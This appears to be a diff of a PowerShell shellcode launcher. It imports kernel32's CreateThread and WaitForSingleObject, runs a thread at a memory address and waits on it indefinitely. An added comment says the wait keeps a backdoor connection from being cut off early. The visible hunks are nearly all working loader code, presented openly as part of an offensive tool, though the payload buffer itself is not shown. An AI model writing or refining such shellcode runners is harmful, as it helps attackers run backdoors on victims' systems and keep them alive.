@@ -8,7 +8,7 @@ public class Kernel32 {
     [DllImport("kernel32", CharSet=CharSet.Ansi)]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     [DllImport("kernel32.dll", SetLastError=true)]
-public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
 }
 "@
 
@@ -25,3 +25,5 @@ $size = $buf.Length
 $thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);
 
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+
+# IN SUMMARY; This code acts like ShellCodeLauncher.ps1 with the difference that adds the WaitForSingleObject that waits for the termination of the shellcode subprocess to terminate before to terminate current powershell process in order to avoid the backdoor connection to be terminated early than expected.
